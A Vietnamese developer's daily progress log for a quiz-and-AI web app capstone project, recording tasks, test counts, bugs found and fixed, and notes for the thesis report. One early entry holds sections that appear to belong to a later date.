# Nhật ký tiến độ hàng ngày

> **Cách dùng:** Mỗi ngày làm việc tạo 1 mục theo [mẫu ở cuối file](#-mẫu-ngày-copy-để-dùng).
> Đổi `[ ]` → `[x]` khi làm xong. Việc chưa xong ghi vào **Nợ / chuyển ngày** để hôm sau kéo tiếp.
> Cột "Ghi chú báo cáo" là chỗ ghi nhanh số liệu / quyết định kỹ thuật để sau chép vào báo cáo đồ án.

**Ký hiệu:** `[ ]` chưa làm · `[x]` xong · `[~]` đang làm dở · `[!]` bị chặn/vướng

---

## Bảng theo dõi nhanh

| Ngày | Trọng tâm | Xong / Tổng | Trạng thái |
|------|-----------|-------------|------------|
| 27/07 | Khởi tạo repo + hạ tầng Docker | 0/4 | 🟡 đang làm |
| 05/08 | Hạ tầng 3 CSDL + khung BE/FE + **lát cắt Auth hoàn chỉnh** | 7/7 | 🟢 xong |
| 06/08 | Tái cấu trúc package + **lát cắt Quản lý Quiz & Câu hỏi** | 5/5 | 🟢 xong |
| 06/08 (tối) | Chuẩn giao diện Udemy + **lát cắt Làm bài quiz** + ảnh bìa quiz | 7/7 | 🟢 xong |
| 07/08 | **Lát cắt Phòng đấu real-time** (STOMP + Redis Pub/Sub) | 6/6 | 🟢 xong |
| 07/08 (chiều) | **Lát cắt AI + RAG sinh đề** — đã gọi Gemini thật | 7/7 | 🟢 xong |
| 07/08 (tối) | Mã PIN + QR, khách vãng lai, avatar, phòng chờ live | 7/7 | 🟢 xong |
| 07/08 (đêm) | Hồi quy toàn bộ + bít lỗ hổng phiên đăng nhập | 5/5 | 🟢 xong |
| 08/08 | **FR-4 quên mật khẩu qua OTP email** (Gmail App Password) | 6/6 | 🟢 xong |
| 08/08 (chiều) | **FR-3 đăng nhập bằng Google** (luồng ID token) + vá lỗi đua Redis/CSDL | 7/7 | 🟢 xong |
| 09/08 | **FR-30 AI chấm câu tự luận** (chấm nền + rubric + chống prompt injection) | 7/7 | 🟢 xong |
| 09/08 (chiều) | **Lọc câu hỏi theo chủ đề** — soạn quiz theo môn không phải lật hết ngân hàng | 6/6 | 🟢 xong |
| 09/08 (tối) | **Lát cắt 7: gợi ý quiz bằng Neo4j** — trụ cột MVP thứ tư | 7/7 | 🟢 xong |
| 10/08 | **Đo tải phòng đấu — số liệu mục 3.5** (bắt buộc theo phiếu) | 5/5 | 🟢 xong |
| 10/08 (chiều) | **Lát cắt 9: thống kê** (FR-85, FR-86) + trả nợ màn chấm tay của lát cắt 6 | 7/7 | 🟢 xong |
| 10/08 (tối) | Vá 3 lỗi lộ ra khi chạy thật, trong đó **bộ test xoá sạch đồ thị máy dev** | 3/3 | 🟢 xong |
| 11/08 | **Lát cắt 8: Trợ lý học tập RAG** (FR-31) — [M] cuối cùng của phiếu | 7/7 | 🟢 xong |
| 10/08 (đêm) | Chuẩn bị đo mục 3.6 · chốt: **xAI Grok không có gói miễn phí** | 4/4 | 🟡 chờ hạn mức |
| 13/08 | **Chỉ mục IVFFlat làm sai kết quả RAG** (V11 bỏ chỉ mục) + 4 chỗ giao diện hứa quá tay | 6/6 | 🟢 xong |
| 14/08 | Hạ tầng test frontend (vitest + jsdom) · **đo mục 3.6 độ chính xác AI** | 5/5 | 🟢 xong |
| 14/08 (chiều) | **Lát cắt 10 phần 1: quản trị người dùng + giám sát AI** (V12) | 6/6 | 🟢 xong |
| 14/08 (tối) | **Lát cắt 10 phần 2: khu quản trị có khung riêng** — 16 API, 6 trang, 19 test | 7/7 | 🟢 xong |
| 16/08 | Sửa trùng mã FR (87 mã, 1..87) · **Lát cắt 11: Flashcard + SRS** — 12 API, 3 trang, 17 test | 7/7 | 🟢 xong |
| 16/08 (tối) | **FR-38: AI sinh thẻ từ học liệu** (V14) — đo thật 6/6 thẻ hợp lệ, 10s | 5/5 | 🟢 xong |
| 16/08 (đêm) | **Lát cắt 13: Gamification** (V15) — XP/cấp/chuỗi/huy hiệu/thử thách, 21 test | 6/6 | 🟢 xong |
| 17/08 | **Lát cắt 15: Xếp hạng theo mùa** (V16) — Redis ZSET dựng lại được, 9 test · sửa 2 flake chat | 6/6 | 🟢 xong |
| 17/08 (tối) | **Lát cắt 12: Chống gian lận** (V17) — 6 tín hiệu, điểm rủi ro, AI nhận định, 44 test · bỏ FR-44 có lý do · trả lời một câu hỏi làm lộ lỗ trong FR-47 | 8/8 | 🟢 xong |
| 18/08 | **Lát cắt 16: Thông báo** (V18) — job nhắc ôn 7:00, real-time qua Redis→STOMP, chuông + cài đặt, 29 test · trả nốt FR-53 của tính năng 13 | 7/7 | 🟢 xong |
| 18/08 (chiều) | **Lát cắt 14: Lớp học** (V19) — mã lớp, giao bài, bảng theo dõi, 32 test · **ĐỦ 16/16 chức năng** · chặn Admin khỏi khu học tập · sửa flake chat lần cuối | 9/9 | 🟢 xong |

| 19/08 | **Cảnh báo gian lận live trong phòng đấu** (V20) — cờ riêng cho host, nhắc riêng, khuôn lặp thay vì đếm số lần, 30 test · phát hiện thiết kế đã chốt không khớp schema · sửa 1 test đỏ có sẵn trên `main` | 8/8 | 🟢 xong |

| 20/08 | **Đổi dự phòng AI sang Groq** · **FR-48 thi nghiêm ngặt** (V21) · **FR-58 xuất bảng điểm CSV** · **FR-84 hạn mức AI** (V22) — 494 test BE / 67 FE · sửa 2 lỗi có sẵn | 13/13 | 🟢 xong — fallback đo thật, tìm & sửa 1 lỗi khi chạy thật |
| 20/08 (chiều) | **Làm nốt 6 mục hoãn**: FR-11, FR-36, FR-32, FR-12, FR-64, FR-69 — hết mục ⏳ | 6/6 | 🟢 xong |
| 20/08 (tối) | **Đánh bóng phần người dùng thấy**: số người đã học · sửa hồ sơ + ảnh đại diện · chân trang · hover thẻ quiz · **đăng ký Google nhận đúng vai trò** — 571 test BE / 67 FE | 5/5 | 🟢 xong — 2 lỗi thật do người dùng chỉ ra |

> 🔴 chưa bắt đầu · 🟡 đang làm · 🟢 xong · 🔵 nghỉ/đệm

---

## 📅 T2 — 27/07/2026 — Khởi tạo dự án & hạ tầng

**Mục tiêu hôm nay:** Dựng khung BE + FE và chạy được 3 CSDL bằng Docker.

### Nhiệm vụ
- [ ] Khởi tạo project Spring Boot (Maven, Java 21, cấu trúc package chuẩn)
- [ ] Khởi tạo project FE React + Vite + TypeScript
- [ ] Docker Compose: PostgreSQL (+pgvector), Neo4j, Redis — chạy `docker compose up -d` OK
- [ ] BE kết nối được 3 CSDL (health check khởi động không lỗi)

### Đã làm được
_(ghi lại khi kết thúc ngày)_

### Bấm thử trên trình duyệt lộ ra một khoảng trống, đã vá luôn

Màn kết quả hiện đúng như thiết kế: điểm trắc nghiệm ra ngay, banner "AI đang chấm", thẻ tím trên
câu tự luận. Nhưng lúc đó quota Gemini đã cạn nên vòng quay **đứng yên khoảng 6 phút** (6 lần thử ×
60 giây) rồi mới chuyển sang cảnh báo cam.

Vấn đề không phải ở chỗ chậm — chờ là đúng, vì chờ mới chấm được. Vấn đề là **hệ thống biết mà không
nói**: backend nắm rõ nó đang vướng 429 và còn bao nhiêu giây, nhưng response chỉ có một cờ
`gradingPending` chung cho cả "chờ 3 giây" lẫn "chờ 6 phút". Người học nhìn vòng quay câm thì đoán
là hỏng và đóng trang.

Vá: `AiThrottleState` lưu ở Redis mốc "gọi lại được lúc nào", `AiOrchestrator` ghi vào đó mỗi khi
**chính provider** nói phải chờ bao lâu (không ghi với backoff tự nghĩ cho lỗi mạng — cái đó vài
giây, không đáng báo). Response thêm `aiThrottledSeconds`; giao diện đổi hẳn câu chữ sang *"Đang xếp
hàng chờ dịch vụ AI — khoảng N giây nữa. Bạn cứ đóng trang, điểm vẫn được chấm và lưu lại."*, và
giãn nhịp hỏi lại từ 3 giây lên 10 giây vì hỏi dày trong lúc chờ cả phút là gọi hai chục lần vô ích.

Hai chi tiết nhỏ nhưng cố ý: chỉ hỏi Redis khi bài **còn câu chờ chấm** (endpoint này bị gọi lại
liên tục nên không nên chạm Redis vô ích), và bài đã xong thì **không nhắc chuyện hạn mức** dù hệ
thống đang căng — nhắc là gây hiểu nhầm. Cả hai đều có ca test riêng.

### Lấp lỗ hổng test của lát cắt 5 — và lộ ra một lỗi im lặng

Lát cắt 6 sửa vào `QuestionGenerationService` và `MaterialIngestionService` (cho phép chờ lâu hơn
khi vướng hạn mức). Lúc định hoãn phần kiểm chứng lại thì nhận ra: **hai lớp đó không có test tự
động nào cả.** Cả thư mục `ai/` chỉ có test cho hai lớp thuần logic (`QuestionJsonParser`,
`TextChunker`); toàn bộ *luồng* nạp học liệu và sinh đề chỉ được kiểm bằng bộ nghiệm thu chạy tay
với Gemini thật — nghĩa là hết hạn mức là mất luôn khả năng biết luồng có vỡ hay không.

Viết `AiGenerationIntegrationTest` (12 ca, mock `AiOrchestrator` nên không cần mạng): nạp học liệu →
READY, embedding hỏng → FAILED kèm lý do, job sinh đề chạy nền, mô hình lỗi → FAILED, JSON hỏng →
không lưu rác vào ngân hàng, học liệu và job là dữ liệu riêng, Learner bị chặn, và Creator phải duyệt
thì câu mới vào ngân hàng.

**Ngay lần chạy đầu nó bắt được một lỗi có sẵn:** câu do AI sinh, sau khi Creator duyệt, vào ngân
hàng với `source = MANUAL` — `AiJobService.approve` gọi `questionService.create` vốn để mặc định.
`docs/database.md` đã ghi cột `source: manual / ai_generated` từ đầu, nhưng không có gì gán giá trị
kia. Hậu quả: câu AI nằm lẫn với câu tự soạn, **không còn cách nào tách ra** — mất luôn khả năng
thống kê "AI đóng góp bao nhiêu phần ngân hàng đề" (một con số đáng có trong báo cáo) lẫn khả năng
rà lại nếu phát hiện một model sinh hàng loạt câu sai. Đã sửa, và gắn thêm `ai_metadata` ghi jobId
để truy ngược được sau nhiều tháng.

Đáng nói: lỗi này **không làm request nào đỏ lên**. API trả 201, câu hỏi hiện đúng trên giao diện,
bộ nghiệm thu tay với Gemini thật cũng đạt — vì không ai nghĩ tới việc kiểm cột `source`. Chỉ có
test viết ra để hỏi đúng câu hỏi đó mới thấy.

### Nợ / chuyển sang ngày sau
- _(...)_

### Vướng mắc
- _(...)_

### Ghi chú báo cáo
- _(quyết định kỹ thuật, version, cấu hình quan trọng cần đưa vào báo cáo)_

---

## 📅 T4 — 05/08/2026 — Dựng & kiểm tra hạ tầng 3 CSDL

**Mục tiêu hôm nay:** Chạy được PostgreSQL + Neo4j + Redis bằng Docker Compose và xác nhận kết nối thật.

### Nhiệm vụ
- [x] `docker compose up -d` — 3 container lên, kiểm tra kết nối từng CSDL
- [x] Khởi tạo project Spring Boot trong `backend/` (Maven, Java 21, package `com.datn.quizai`)
- [x] Khởi tạo project React + Vite + TypeScript trong `frontend/`
- [x] BE khởi động được, FE gọi được BE qua proxy, test `contextLoads` pass

### Đã làm được
- Tạo `.env` từ `.env.example` (đã gitignore).
- `docker compose up -d`: `quiz_postgres`, `quiz_neo4j`, `quiz_redis` đều Up; volume `datn_pgdata`, `datn_neo4jdata`, `datn_redisdata` được tạo mới.
- Kiểm tra thật từng CSDL:
  - PostgreSQL **16.14**, extension `vector` **0.8.6** đã bật sẵn qua `infra/postgres/init/01-extensions.sql`; thử toán tử cosine `'[1,2,3]'::vector <=> '[1,2,4]'::vector` = 0.00854 → pgvector hoạt động.
  - Neo4j 5: `cypher-shell` trả kết quả OK (bolt 7687, browser 7474).
  - Redis 7: `PING` → `PONG`.
- Chốt quy ước phát triển: monorepo `backend/` + `frontend/`, lát cắt dọc từng tính năng — `docs/conventions.md §6–§7`.

- Dựng khung `backend/`: Spring Boot 3.5.16, Java 21, Maven wrapper, 14 package theo `architecture.md §3`, `application.yml` đọc cấu hình từ biến môi trường.
- Dựng khung `frontend/`: React 19 + Vite 8 + TS, Ant Design v6, Tailwind v4 (không nạp preflight), TanStack Query, React Router 7, Zustand, RHF + Zod, axios client tập trung, proxy `/api` `/ws` `/actuator` sang :8080.
- `SecurityConfig` nền: chốt luật Guest — `/api/v1/auth/**` và `GET /api/v1/quizzes*` mở, còn lại `authenticated()`.
- **Kiểm chứng chạy thật:** `mvn test` pass (`contextLoads`), `npm run build` pass, BE trả `{"status":"UP"}`, FE dev server gọi BE qua proxy OK.
- Ma trận quyền đo bằng curl: `/actuator/health` 200 · `/api/v1/quizzes` 404 (qua được security, chưa có controller) · `/api/v1/users/me` **401** · `/v3/api-docs` 200.

### Lát cắt 1 — Xác thực & phân quyền (features/01-auth) ✅

- **Migration** `V1__init.sql`: `CREATE EXTENSION vector` + bảng `users` (UUID PK, unique email, CHECK role, timestamptz).
- **Backend**: `BaseEntity` · `User`/`Role`/`UserRepository` · `JwtService` (HS256, 15 phút) · `RefreshTokenService` (Redis `session:{token}`, TTL 14 ngày, **rotation** — token cũ dùng lại bị 401) · `JwtAuthenticationFilter` · `AuthService` · `AuthController` (register/login/refresh/logout/change-password) · `UserController` (`GET`/`PUT /users/me`) · `GlobalExceptionHandler` (response lỗi chuẩn + traceId) · `SecurityConfig` (401/403 JSON, `@EnableMethodSecurity`) · `OpenApiConfig` (Swagger có nút Authorize) · `DotenvEnvironmentPostProcessor` (nạp `.env` khi chạy local).
- **Frontend**: `features/auth/` gồm api client, Zustand store (persist), RHF + Zod, trang Đăng nhập / Đăng ký / Hồ sơ, `ProtectedRoute`, interceptor tự refresh khi 401 rồi phát lại request.
- **Test: 30/30 pass** — `AuthServiceTest` 13 (Mockito) · `UserRepositoryTest` 5 (@DataJpaTest + Testcontainers pgvector, Flyway chạy thật) · `AuthControllerTest` 6 (@WebMvcTest, validate + mã lỗi) · `AuthFlowIntegrationTest` 5 (@SpringBootTest + Postgres & Redis container) · `contextLoads` 1.
- **Kiểm chứng bằng curl (18 ca)**: đăng ký 201 · trùng email khác hoa/thường 409 · `/users/me` không token 401, có token 200 · token rác 401 · sai mật khẩu 401 · refresh rotation (token cũ 401) · logout 204 rồi refresh 401 · đổi mật khẩu 204 + đăng nhập bằng mật khẩu mới 200, mật khẩu cũ 401 · validate 400 kèm `fieldErrors` tiếng Việt · JSON sai cú pháp 400 · tự xin ADMIN bị hạ về LEARNER.
- **FE↔BE qua proxy Vite**: `/`, `/login`, `/register` trả 200; `POST /api/v1/auth/register` → 201; `GET /api/v1/users/me` → 200 đúng tên tiếng Việt.
- Tài khoản demo trong DB dev: `minh.duc@example.com` / `MatKhauMoi@456` (CREATOR) và `demo@example.com` / `MatKhau@123` (LEARNER).

### Nợ / chuyển sang ngày sau
- **FR-4 quên/đặt lại mật khẩu**: chưa làm — cần chốt nhà cung cấp SMTP rồi thêm biến môi trường.
- **FR-3 OAuth2 Google**: mức [S], để sau khi xong 4 trụ cột.
- ✅ Đã xem trên trình duyệt: trang đăng nhập render đúng (Ant Design + Tailwind + dấu tiếng Việt). Ảnh chụp để dành cho **mục 3.2** — lưu vào `docs/bao-cao/hinh-anh/` theo tên `hinh-3-x-<mo-ta>.png`.
- Lát cắt kế tiếp: **02-quiz-management** (schema `categories`/`quizzes`/`questions`/`question_options`/`quiz_questions`).

### Vướng mắc
- **Xung đột cổng 5432 (đã xử lý xong):** máy đã cài sẵn PostgreSQL 17 (5432) và 18 (5433) chạy dạng service Windows → JDBC nối nhầm vào Postgres của máy, báo `password authentication failed for user "quiz"`. Ban đầu tạm chuyển container sang cổng 5434; sau đó **đã gỡ hẳn 2 bản PostgreSQL cài trên máy** nên trả container về **cổng chuẩn 5432**, test lại pass.
- Tiến độ chậm so với `ke-hoach-tien-do.md` (kế hoạch tuần 1 là 20–26/07, nay đã 05/08) → cần dồn Auth + Quiz trong các ngày tới.

### Ghi chú báo cáo
- **Mục 3.1 (Môi trường triển khai):** Docker Desktop 28.0.1 trên Windows 11; image `pgvector/pgvector:pg16` (PostgreSQL 16.14 + pgvector 0.8.6), `neo4j:5`, `redis:7-alpine`; cổng 5432 / 7474+7687 / 6379. Backend Spring Boot 3.5.16 + JDK 21.0.3, Maven 3.9.11; Frontend Node 22.17 + Vite 8.
- **Mục 1.6:** pgvector bật bằng `CREATE EXTENSION vector` lúc container khởi tạo lần đầu, dùng toán tử `<=>` (cosine distance) cho retrieval RAG.
- **Mục 2.3 / 3.4 (bảo mật):** có số liệu thực nghiệm đầu tiên — bảng mã trạng thái chứng minh Guest bị chặn đúng thiết kế (401 với `/users/me`, đi qua với `/quizzes`).
- **Mục 2.6 (đặc tả UC):** đủ dữ liệu viết UC_DangKy, UC_DangNhap, UC_DangXuat, UC_DoiMatKhau (luồng chính + luồng thay thế lấy từ 18 ca curl ở trên).
- **Mục 2.8 (CSDL):** bảng `users` — mô tả cột theo `V1__init.sql`; nêu rõ chọn `role` là cột enum đơn thay vì bảng `roles`/`permissions` riêng (3 vai trò, không cần phân quyền động).
- **Mục 3.4 (kịch bản kiểm thử):** 30 test tự động, tỉ lệ pass 100% — chia theo tầng: 13 unit service, 5 JPA (Testcontainers), 6 web MVC, 5 integration, 1 context.
- **Điểm nhấn kỹ thuật đáng viết vào báo cáo:** refresh token **rotation** lưu ở Redis (một token chỉ dùng được một lần) và thông báo đăng nhập sai **không tiết lộ** email có tồn tại hay không.

---

## 📅 T5 — 06/08/2026 — Lát cắt 2: Quản lý Quiz & Câu hỏi

**Mục tiêu hôm nay:** Hoàn thiện CRUD quiz + ngân hàng câu hỏi 5 loại, cả BE và FE, có test.

### Nhiệm vụ
- [x] Tái cấu trúc package backend: mỗi feature có `controller/ service/ repository/ domain/ dto/`
- [x] Migration `V2__quiz_and_questions.sql`
- [x] Backend: CRUD quiz, ngân hàng câu hỏi, gắn câu hỏi vào quiz theo thứ tự
- [x] Frontend: danh sách quiz, form quiz, ngân hàng câu hỏi, màn soạn quiz
- [x] Test 55/55 pass + 25/25 kiểm chứng HTTP thật

### Đã làm được

**Tái cấu trúc cấu trúc mã nguồn** (theo yêu cầu): nhóm theo tính năng, trong mỗi tính năng chia tiếp theo tầng — `auth/{controller,service,security,dto}`, `user/{controller,service,repository,domain,dto}`, `quiz/{controller,service,repository,domain,dto}`; `config/` và `common/` giữ phẳng. Đã cập nhật `architecture.md §3` + `CLAUDE.md`. 42 file được chuyển bằng script, giữ lịch sử git.

**Migration V2:** `categories` (nạp sẵn 6 danh mục), `quizzes`, `questions`, `question_options`, `quiz_questions` (bảng nối có `order_index`, UNIQUE `(quiz_id, question_id)`), kèm CHECK constraint cho enum và index cho truy vấn danh sách.

**Backend:** `QuizService` (CRUD + lọc + phân trang + đặt lại danh sách câu hỏi), `QuestionService` (ngân hàng + **luật riêng cho 5 loại câu hỏi**), `CategoryService`, `OwnershipGuard` dùng chung, `PageResponse<T>` thay cho `Page` của Spring Data.

**Frontend:** `features/quiz/` — trang "Khám phá quiz" và "Quiz của tôi" (dùng chung component, khác tham số `mine`), modal tạo/sửa quiz, trang ngân hàng câu hỏi, màn soạn quiz (chọn câu từ ngân hàng, đổi thứ tự, lưu cả danh sách), `AppLayout` có thanh điều hướng theo vai trò.

**Kiểm thử — 55/55 pass:** thêm `QuestionServiceTest` 15 ca (luật từng loại câu hỏi + quyền sở hữu) và `QuizManagementIntegrationTest` 10 ca (Testcontainers Postgres + Redis).
**Kiểm chứng HTTP thật — 25/25:** tạo quiz → tạo đủ 5 loại câu hỏi → gắn 5 câu → đảo thứ tự → xóa câu đang dùng bị 409 → Guest xem PRIVATE 404 / lấy câu hỏi 401 → Learner 403 → xuất bản PUBLIC rồi Guest tìm thấy nhưng response không chứa câu hỏi → phân trang 3/5 câu, 2 trang.

### Bốn lỗi gặp phải và cách sửa
1. **`MultipleBagFetchException`** — fetch cùng lúc hai collection `List` (`quizQuestions` + `options`). Sửa: chỉ fetch một, còn lại nạp theo lô bằng `@BatchSize(50)`.
2. **Vi phạm UNIQUE `uk_quiz_questions` khi chỉ đổi thứ tự** — Hibernate chèn dòng mới trước khi xóa dòng cũ. Sửa: `entityManager.flush()` ngay sau khi `clear()`.
3. **`questionCount` bị 0 sau khi vừa gắn câu hỏi** — `@Formula` tính lúc nạp entity nên giá trị cũ. Sửa: response chi tiết đếm từ danh sách đã nạp.
4. **`function lower(bytea) does not exist`** — JPQL gọi `lower(:param)` với tham số null, PostgreSQL không suy được kiểu. Sửa: ghép mẫu LIKE (chữ thường + `%`) ở service. **Bug này lọt qua 53 test vì chưa test ca liệt kê không truyền bộ lọc** → đã bổ sung 2 test cho đúng lỗ hổng đó.

### Nợ / chuyển sang ngày sau
- FR-11 đính kèm ảnh cho câu hỏi (cần chốt nơi lưu file), FR-12 import/export.
- FR-4 quên mật khẩu (chờ chốt SMTP), FR-3 OAuth2 Google.
- Chưa xem FE lát cắt 2 trên trình duyệt.
- Lát cắt kế tiếp: **03-gameplay** (làm bài, chấm tự động, lịch sử).

### Ghi chú báo cáo
- **Mục 2.8:** ERD nay có 6 bảng — `users`, `categories`, `quizzes`, `questions`, `question_options`, `quiz_questions`. Nêu rõ vai trò bảng nối `quiz_questions` (tái sử dụng câu hỏi + thứ tự riêng theo quiz).
- **Mục 2.6:** thêm UC_TaoQuiz, UC_QuanLyCauHoi, UC_GanCauHoiVaoQuiz — luồng thay thế lấy từ các ca 400/403/404/409 đã kiểm chứng.
- **Mục 3.4:** 55 test tự động (100% pass) + bảng 25 ca kiểm chứng HTTP; nên đưa cả 4 lỗi ở trên vào phần "khó khăn & cách giải quyết" — đây là dẫn chứng kỹ thuật tốt khi bảo vệ.
- **Mục 1.6 / 2.3:** dùng `@Formula` + `@BatchSize` để tránh N+1 khi liệt kê quiz là chi tiết tối ưu hiệu năng đáng viết.

---

## 📅 T5 — 06/08/2026 (buổi tối) — Chuẩn giao diện + Lát cắt 3: Làm bài quiz

**Mục tiêu hôm nay:** Dựng chuẩn giao diện dùng chung cho cả dự án, rồi làm trọn lát cắt người học làm bài — chấm điểm, xem kết quả, lịch sử, bảng xếp hạng.

### Nhiệm vụ
- [x] Chuẩn giao diện `docs/ui-design-system.md` + token antd/Tailwind, áp cho toàn bộ 7 trang cũ
- [x] Migration `V3__attempts.sql`
- [x] Backend: bắt đầu bài → trả lời → nộp → chấm tự động → lịch sử → bảng xếp hạng
- [x] Frontend: trang giới thiệu quiz, màn làm bài có đồng hồ, màn kết quả, trang lịch sử
- [x] Test 97/97 pass (thêm 42 ca)
- [x] Ảnh bìa quiz: tải ảnh lên server, kiểm bằng chữ ký byte
- [x] Kiểm chứng HTTP thật 48/48 trên backend đang chạy

### Đã làm được

**Chuẩn giao diện** (`docs/ui-design-system.md`): hai bộ mặt — trang người học dùng **lưới card**, trang quản lý dùng **bảng**; token màu/bo góc/typography tập trung ở `shared/theme/antdTheme.ts` và `@theme` của Tailwind v4; nút hành động chính màu đen, tím chỉ cho link; component dùng chung `PageHeader`, `EmptyState`, `QuizCard`. Luật tuân thủ đã ghi vào `CLAUDE.md` và `conventions.md §2`, trong đó có điều **không bịa dữ liệu** (rating, số lượt học) để trang trông giống trang thương mại.

**Migration V3:** `quiz_attempts` (mode, status, expires_at, total/max_score) và `attempt_answers` (user_answer JSONB, is_correct, score, max_score, graded_by). Đáng chú ý là **chỉ mục một phần** `uk_quiz_attempts_in_progress ... WHERE status = 'IN_PROGRESS'` — dùng chính CSDL để bảo đảm mỗi người tối đa một bài dở trên một quiz.

**Backend:** `AttemptService` (6 nghiệp vụ) + `AnswerGrader` tách riêng thành lớp thuần Java không phụ thuộc Spring nên test được trực tiếp. Chấm tự động 4 loại câu hỏi, câu tự luận đánh dấu `PENDING_AI` chờ features/06.

**Frontend:** `features/attempt/` — trang giới thiệu quiz (chọn chế độ, bảng xếp hạng, lần làm gần đây), màn làm bài một câu/lần có đồng hồ đếm ngược + lưới nhảy câu + thanh tiến độ, màn kết quả đối chiếu đáp án và giải thích, trang lịch sử làm bài. Route `/attempts/:id` phục vụ cả lúc đang làm lẫn lúc xem kết quả, phân biệt bằng `attempt.status`.

**Chín quyết định thiết kế** đã ghi đầy đủ ở [features/03-gameplay.md](../features/03-gameplay.md#quyết-định-thiết-kế-đã-hiện-thực). Ba cái quan trọng nhất:
1. **Chốt đề lúc bắt đầu** — sao câu hỏi thành dòng `attempt_answers` kèm điểm tối đa, nên chủ quiz sửa đề giữa chừng không làm hỏng bài đang làm (có test chứng minh).
2. **Không lộ đáp án khi chưa nộp** — kể cả `options` của câu điền khuyết/tự luận cũng bị giấu, vì đáp án của chúng nằm ngay trong `question_options`.
3. **Hết giờ chốt kiểu "lười"** — không cần job nền: lần gọi `GET`/`submit` kế tiếp tự chuyển bài sang `EXPIRED` và chấm phần đã làm.

**Kiểm thử — 86/86 pass** (55 → 86, thêm 31 ca): `AnswerGraderTest` 15 ca (phủ từng loại câu hỏi, gồm ca "toan ≠ toán" và ca tự luận bỏ trống), `AttemptFlowIntegrationTest` 16 ca trên Testcontainers Postgres + Redis.
**Kiểm chứng HTTP thật — 48/48** trên backend đang chạy: dựng 3 tài khoản, quiz 5 loại câu, kiểm cả luồng thi lẫn luyện tập, quyền truy cập, hết giờ, idempotent, lịch sử và bảng xếp hạng.

### Ba lỗi gặp phải và cách sửa
1. **`Could not deserialize string to java type: AnswerPayload`** — Jackson coi `isEmpty()` của record là thuộc tính `empty`, ghi thừa vào JSONB rồi lần đọc sau không nhận ra. Sửa: `@JsonIgnore` trên phương thức đó. *Lỗi chỉ lộ ra ở lần **đọc lại** dòng đã ghi, nên phải chạy thật mới thấy.*
2. **`Cannot project java.time.Instant to java.time.OffsetDateTime`** — projection của native query trả `Instant` cho cột `timestamptz`. Sửa: khai `Instant` trong projection, đổi múi giờ ở service.
3. **Không tự nộp bài trong `POST /answers` khi hết giờ** — ném lỗi 409 sẽ rollback luôn việc nộp. Sửa: chỉ trả 409, để `GET`/`submit` kế tiếp chốt bài; kết quả không đổi vì chấm dựa trên dữ liệu đã lưu.

### Thiếu sót phát hiện khi rà lại
- **Chủ quiz không có lối vào để làm bài trên quiz của mình.** Backend vốn cho phép (đã kiểm chứng: PRIVATE lẫn PUBLIC đều 201, đáp án vẫn bị giấu), nhưng giao diện chỉ có nút "Soạn câu hỏi" nên không ai bấm tới được — quiz PRIVATE lại không hiện ở trang Khám phá. Sửa: thêm nút **"Làm thử"** ở trang *Quiz của tôi* và ở màn soạn quiz, thêm `ownerId` vào `QuizSummaryResponse` để trang giới thiệu nhận ra chủ quiz.
- **Bài của chủ quiz lẽ ra không được tính vào bảng xếp hạng.** Người soạn đề biết trước đáp án nên luôn đạt điểm tuyệt đối, để lên bảng thì bảng mất ý nghĩa. Sửa: thêm `a.user_id <> q.owner_id` vào truy vấn xếp hạng; điểm của chủ quiz vẫn nằm trong lịch sử cá nhân. Thêm 1 test integration (86/86 pass) kiểm đúng ca này: chủ quiz đạt 5/5 mà bảng vẫn rỗng, người học nộp 0 điểm vẫn đứng hạng 1.

### Nợ / chuyển sang ngày sau
- **Chưa xem lát cắt 2 và 3 trên trình duyệt bằng mắt** — mới kiểm được build, mã HTTP và test tự động.
- Giờ riêng từng câu (`questions.time_limit_sec`) đã lưu nhưng chưa cưỡng chế — để dành cho phòng đấu real-time.
- Chấm câu tự luận bằng AI (features/06); đồng bộ attempt sang Neo4j (features/07).
- Xếp hạng theo danh mục (FR-19 phần còn lại).
- FR-4 quên mật khẩu (chờ chốt SMTP), FR-3 OAuth2 Google, FR-11 ảnh câu hỏi, FR-12 import/export.
- Lát cắt kế tiếp: **04-multiplayer-realtime** (phòng đấu STOMP + Redis).

### Bổ sung: ảnh bìa quiz (FR-11, phần ảnh cho quiz)

Lưới card trước đó dùng khối màu tự sinh thay ảnh. Đã chốt phương án **tải ảnh lên server** (thay vì
dán URL bên ngoài) — cũng là quyết định mở khoá cho ảnh câu hỏi sau này, vì dùng chung một endpoint.

- **V4:** `quizzes.thumbnail_url VARCHAR(500)`.
- **Package `file/`:** `FileStorageService` + `ImageType`; `POST /api/v1/files/images` trả về đường dẫn công khai, `WebMvcConfig` phục vụ tĩnh `/uploads/**` kèm `Cache-Control` 30 ngày.
- **Nơi lưu:** thư mục đĩa local (`app.storage.upload-dir`), đã gitignore. Chọn đĩa local vì đồ án chạy một máy chủ; muốn đổi sang S3/MinIO chỉ cần thay `FileStorageService`.
- **Ba chốt chặn an ninh** (đáng viết vào mục bảo mật của báo cáo):
  1. Nhận dạng ảnh bằng **chữ ký byte** (magic number), không tin `Content-Type` client khai — đã kiểm chứng: script PHP, file `.exe`, file WAV đội lốt ảnh đều bị chặn 400.
  2. Tên file do server sinh từ UUID, **bỏ hẳn tên client gửi lên** → không có đường path traversal.
  3. `thumbnailUrl` chỉ nhận đường dẫn nội bộ `/uploads/…`; URL ngoài bị chặn để tránh link chết và pixel theo dõi nhúng qua ảnh bên thứ ba.
- **Phân quyền:** chỉ CREATOR/ADMIN tải được ảnh (Learner 403, Guest 401); nhưng **xem ảnh thì công khai** vì card quiz phải hiện với Guest.
- **Frontend:** `ImageUploader` dùng chung, xem trước 16:9, đổi/bỏ ảnh; card và trang giới thiệu hiện ảnh thật, quiz chưa có ảnh vẫn rơi về khối màu cũ nên không trang nào bị trống.
- **Kiểm thử: 97/97 pass** (thêm 11 ca: `ImageTypeTest` 5 + `FileUploadIntegrationTest` 6) và **19/19 ca kiểm chứng HTTP thật** bằng file PNG sinh trực tiếp trong script test.
- **Hạn chế đã biết, ghi rõ trong mã:** đổi ảnh bìa thì file cũ vẫn nằm lại trên đĩa. Dọn file mồ côi cần biết chắc không quiz nào còn trỏ tới — để sau nếu còn thời gian.
- **Một lỗi gặp phải:** `@WebMvcTest` nạp `WebMvcConfig` nhưng không tạo bean `@Service`, nên tiêm `FileStorageService` vào lớp cấu hình làm gãy toàn bộ 6 test controller. Sửa: `WebMvcConfig` đọc thẳng thuộc tính cấu hình, không phụ thuộc service. Ngoài ra `@TempDir` tĩnh còn null lúc `@DynamicPropertySource` chạy → tự tạo thư mục tạm trong static initializer.

### Ghi chú báo cáo
